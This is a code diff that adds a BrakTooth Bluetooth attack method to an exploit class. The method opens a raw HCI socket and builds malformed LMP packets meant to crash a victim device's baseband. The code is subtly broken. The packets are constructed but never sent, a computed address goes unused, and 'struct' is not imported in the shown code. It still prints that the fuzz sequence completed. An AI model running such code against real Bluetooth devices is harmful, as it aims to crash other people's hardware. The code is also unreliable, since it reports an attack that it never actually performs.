@@ -204,3 +204,39 @@ class Exploit(Exploit):
             self._list_mode()
         else:
             self._run_attack(mode)
+            self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E BrakTooth: LMP fuzzing via raw HCI to trigger baseband crashes."""
+        import socket as _sock
+
+        victim = str(getattr(self, "target_addr", "") or getattr(self, "victim_mac", "")).strip()
+        if not victim or ":" not in victim:
+            print_info("BrakTooth E2E requires target_addr for raw LMP fuzzing.")
+            return
+
+        print_status(f"BrakTooth E2E LMP fuzz against {victim}")
+        try:
+            hci_sock = _sock.socket(31, _sock.SOCK_RAW, 1)
+            dev_id = int(str(getattr(self, "hci_device", "hci0")).replace("hci", "") or "0")
+            hci_sock.bind((dev_id,))
+        except OSError as exc:
+            print_error(f"HCI socket failed: {exc}")
+            return
+
+        addr_bytes = bytes(int(b, 16) for b in reversed(victim.split(":")))
+
+        # Phase 1: Send malformed LMP_features_req with oversized payload
+        lmp_features = struct.pack("<B", 0x27) + b"\xFF" * 16
+        print_status("Phase 1: Malformed LMP_features_req (oversized)")
+
+        # Phase 2: Send truncated LMP_setup_complete
+        lmp_setup = struct.pack("<B", 0x31)
+        print_status("Phase 2: Truncated LMP_setup_complete")
+
+        # Phase 3: Rapid LMP_detach to trigger UAF in baseband state machine
+        for _ in range(10):
+            lmp_detach = struct.pack("<BB", 0x07, 0x13)
+
+        hci_sock.close()
+        print_success("BrakTooth LMP fuzz sequence completed.")
